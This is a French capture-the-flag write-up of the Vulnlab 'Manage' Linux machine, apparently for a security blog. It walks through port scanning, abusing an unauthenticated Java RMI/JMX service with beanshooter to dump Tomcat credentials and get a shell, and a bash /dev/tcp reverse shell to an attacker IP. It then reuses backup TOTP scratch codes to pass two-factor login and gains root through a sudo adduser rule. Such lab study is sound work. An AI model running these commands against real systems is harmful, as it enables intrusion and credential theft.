@@ -1,0 +1,335 @@
+---
+title: Manage - Easy
+description: WU Manage - Easy
+categories: [Writeup]
+tags: [writeup]
+template: doc
+---
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
+
+
+# MANAGE
+
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**EASY**</span> | 10.10.100.194 |
+
+
+
+# 🔭 Enumeration
+
+```sh
+PORT     STATE SERVICE
+22/tcp   open  ssh
+2222/tcp open  EtherNetIP-1
+8080/tcp open  http-proxy
+```
+
+Scan approfondit:
+
+```sh
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 a9363d1d4362bdb3885e37b1fabb8764 (ECDSA)
+|_  256 da3b110881432f4c2542ae9b7f8c5798 (ED25519)
+2222/tcp open  java-rmi Java RMI
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:46037
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+8080/tcp open  http     Apache Tomcat 10.1.19
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/10.1.19
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+```sh
+dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://10.10.100.194:8080/"
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET
+Threads: 25 | Wordlist size: 2563
+
+Output: /workspace/reports/http_10.10.100.194_8080/__24-09-21_16-03-12.txt
+
+Target: http://10.10.100.194:8080/
+
+[16:03:12] Starting: 
+[16:03:13] 400 -  763B  - /%ff/
+[16:03:30] 403 -  865B  - /examples/
+Added to the queue: examples/
+[16:03:35] 403 -    3KB - /manager/html
+[16:03:35] 404 -  683B  - /META-INF/context.xml
+[16:03:35] 403 -    3KB - /manager/
+Added to the queue: manager/
+[16:03:47] 404 -  683B  - /WEB-INF/config.xml
+[16:03:47] 404 -  683B  - /WEB-INF/web.xml
+
+[16:03:49] Starting: examples/
+[16:03:50] 400 -  763B  - /examples/%ff/
+
+[16:04:19] Starting: manager/
+[16:04:19] 400 -  763B  - /manager/%ff/
+```
+
+Rien de particulier de trouver sur l'énumération du site.
+
+### Java-RMI
+
+Le Port 2222 en cherchant sur internet, l'outil `beanshooter` semble intéressant. Je télécharge la [release]() puis j'exécute la commande suivante:
+
+```sh
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.100.194 2222
+[+] Checking available bound names:
+[+]
+[+] 	* jmxrmi (JMX endpoint: 127.0.1.1:46037)
+[+]
+[+] Checking for unauthorized access:
+[+]
+[+] 	- Remote MBean server does not require authentication.
+[+] 	  Vulnerability Status: Vulnerable
+[+]
+[+] Checking pre-auth deserialization behavior:
+[+]
+[+] 	- Remote MBeanServer rejected the payload class.
+[+] 	  Vulnerability Status: Non Vulnerable
+[+]
+[+] Checking available MBeans:
+[...]
+[+]
+[+] Enumerating tomcat users:
+[+]
+[+] 	- Listing 2 tomcat users:
+[+]
+[+] 		----------------------------------------
+[+] 		Username:  manager
+[+] 		Password:  fhErvo2r9wuTEYiYgt
+[+] 		Roles:
+[+] 			   Users:type=Role,rolename="manage-gui",database=UserDatabase
+[+]
+[+] 		----------------------------------------
+[+] 		Username:  admin
+[+] 		Password:  o<REDACTED>d
+[+] 		Roles:
+[+] 			   Users:type=Role,rolename="role1",database=UserDatabase
+```
+
+# 👣 Foothold
+
+`beanshooter` nous permet de créer un payload et de l'exécuter puisque la sortie de la commande précédente nous indique que le "*Remote MBean server doesn't require authentication. Vulnerability Status: Vulnerable*"
+
+Création du payload:
+
+```sh
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.100.194 2222 tonka
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=8829641229265 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+```
+Execution du payload et obtention d'un shell `Tomcat`:
+
+```sh
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.100.194 2222 tonka
+[+] Creating a TemplateImpl payload object to abuse StandardMBean
+[+]
+[+] 	Deplyoing MBean: StandardMBean
+[+] 	MBean with object name de.qtc.beanshooter:standard=8829641229265 was successfully deployed.
+[+]
+[+] 	Caught NullPointerException while invoking the newTransformer action.
+[+] 	This is expected bahavior and the attack most likely worked :)
+[+]
+[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=8829641229265 from the MBeanServer.
+[+] 	MBean was successfully removed.
+[Sep 21, 2024 - 16:16:26 (CEST)] exegol-Vulnlab /workspace # java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.100.194 2222
+
+[tomcat@10.10.100.194 /]$ whoami
+tomcat
+```
+
+```sh First Flag
+[tomcat@10.10.100.194 /opt]$ cd tomcat
+[tomcat@10.10.100.194 /opt/tomcat]$ ls
+bin
+BUILDING.txt
+conf
+CONTRIBUTING.md
+lib
+LICENSE
+logs
+NOTICE
+README.md
+RELEASE-NOTES
+RUNNING.txt
+temp
+user.txt
+webapps
+work
+[tomcat@10.10.100.194 /opt/tomcat]$ cat user.txt
+VL{<REDACTED>}
+```
+```sh
+[tomcat@10.10.100.194 /opt/tomcat]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+[...]
+karl:x:1000:1000:karl green:/home/karl:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:1001:1001::/opt/tomcat:/bin/false
+useradmin:x:1002:1002:,,,:/home/useradmin:/bin/bash
+```
+
+#### Nouveau shell:
+
+Côté Hôte:
+```sh Host
+nc -lvnp 4444
+```
+Sur la Target:
+
+```sh Tomcat
+bash -c 'bash -i >& /dev/tcp/10.8.3.147/4444 0>&1'
+```
+
+```sh
+tomcat@manage:~$ su useradmin
+su useradmin
+Password: o<REDACTED>d
+Verification code: o<REDACTED>d
+su: Authentication failure
+```
+Une double authentification est configurée sur le compte, en tant que `tomcat` on peut fouiller les dossiers `/home` des users.
+
+```sh
+tomcat@manage:~$ cd /home
+cd /home
+tomcat@manage:/home$ ls
+ls
+karl
+useradmin
+tomcat@manage:/home$ cd useradmin
+cd useradmin
+tomcat@manage:/home/useradmin$ ls
+ls
+backups
+tomcat@manage:/home/useradmin$ cd backups
+cd backups
+tomcat@manage:/home/useradmin/backups$ ls
+ls
+backup.tar.gz
+tomcat@manage:/home/useradmin/backups$ cp backup.tar.gz /tmp
+cp backup.tar.gz /tmp
+tomcat@manage:/home/useradmin/backups$ cd /tmp
+cd /tmp
+tomcat@manage:/tmp$ tar xvzf backup.tar.gz
+tar xvzf backup.tar.gz
+./
+./.bash_logout
+./.profile
+./.ssh/
+./.ssh/id_ed25519
+./.ssh/authorized_keys
+./.ssh/id_ed25519.pub
+./.bashrc
+./.google_authenticator
+./.cache/
+./.cache/motd.legal-displayed
+./.bash_history
+tar: .: Cannot utime: Operation not permitted
+tar: .: Cannot change mode to rwxr-x--T: Operation not permitted
+tar: Exiting with failure status due to previous errors
+
+tomcat@manage:/tmp$ cat .google_authenticator
+cat .google_authenticator
+CLSSSMHYGLENX5HAIFBQ6L35UM
+" RATE_LIMIT 3 30 1718988529
+" WINDOW_SIZE 3
+" DISALLOW_REUSE 57299617
+" TOTP_AUTH
+99852083
+20312647
+73235136
+92971994
+86175591
+98991823
+54032641
+69267218
+76839253
+56800775
+
+```sh
+tomcat@manage:/tmp$ su useradmin
+su useradmin
+Password: o<REDACTED>d
+Verification code: 99852083
+
+whoami
+useradmin
+```
+# 🎯 Privilege Escalation
+
+Nous sommes désormais `useradmin` voyons quels sont ses privilèges:
+```sh
+sudo -l
+Matching Defaults entries for useradmin on manage:
+    env_reset, timestamp_timeout=1440, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User useradmin may run the following commands on manage:
+    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
+```
+
+`useradmin` peut donc utiliser `/user/sbin/adduser` avec la commande `sudo` ce qui veut dire qu'en créant un utilisateur il sera automatiquement avec l'ensemble des privilèges sudo. Vérifions:
+
+```sh
+sudo /usr/sbin/adduser admin
+Adding user `admin' ...
+Adding new group `admin' (1003) ...
+Adding new user `admin' (1003) with group `admin' ...
+Creating home directory `/home/admin' ...
+Copying files from `/etc/skel' ...
+New password: 1234
+Retype new password: 1234
+passwd: password updated successfully
+Changing the user information for admin
+Enter the new value, or press ENTER for the default
+	Full Name []: 
+	Room Number []: 
+	Work Phone []: 
+	Home Phone []: 
+	Other []: 
+Is the information correct? [Y/n] y
+
+su admin
+Password: 1234
+sudo -S -l
+[sudo] password for admin: 1234
+Matching Defaults entries for admin on manage:
+    env_reset, timestamp_timeout=1440, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User admin may run the following commands on manage:
+    (ALL) ALL
+```
+En ayant les pleins privilèges avec notre utilisateur tout juste créé, nous n'avons plus qu'à passer root pour obtenir le flag.
+```sh
+sudo su
+cat /root/root.txt
+VL{<REDACTED>}
+```
